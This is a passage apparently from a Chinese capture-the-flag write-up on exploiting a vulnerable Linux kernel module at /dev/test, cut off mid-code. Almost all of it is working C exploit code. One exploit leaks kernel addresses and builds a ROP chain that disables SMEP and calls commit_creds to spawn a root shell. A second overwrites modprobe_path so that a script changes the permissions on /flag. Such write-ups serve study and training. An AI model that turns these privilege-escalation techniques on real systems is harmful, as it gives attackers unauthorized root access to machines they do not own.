string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RAX_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8308721f</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_RET</span> <span class="token expression"><span class="token number">0x0000000000000009</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RET</span> <span class="token expression"><span class="token number">0x000000000000000c</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_RET</span> <span class="token expression"><span class="token number">0x000000000000000d</span><span class="token operator">+</span>lkm</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810cf720</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810cfbe0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred<span class="token operator">=</span><span class="token number">0xffffffff82864660</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>init_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] commit_creds = 0x%lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] init_cred = 0x%lx\n"</span><span class="token punctuation">,</span> init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] swapgs_restore_regs_and_return_to_usermode = 0x%lx\n"</span><span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>init_cred<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/7bd4daaa0c22cd99f92eeb95360c7069_MD5.jpeg"></p><p>团长的做法是修改 modprobe_path 指向提权脚本，更直接</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSI_RET</span> <span class="token expression"><span class="token number">0xffffffff811cc553</span><span class="token operator">+</span>koff</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">modprobe_getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo [*] modprobe: `cat /proc/sys/kernel/modprobe`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> modprobe_path<span class="token operator">=</span><span class="token number">0xffffffff82864fc0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>modprobe_path<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] modprobe_path = 0x%lx\n"</span><span class="token punctuation">,</span> modprobe_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/tmp/xx"</span><span class="token punctuation">;</span><span class="token comment">//0xffffffff8107c550 : mov qword ptr [rdi], rsi ; jmp 0xffffffff81e02640</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>modprobe_path<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RSI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xffffffff8107c550</span><span class="token operator">+</span>koff<span 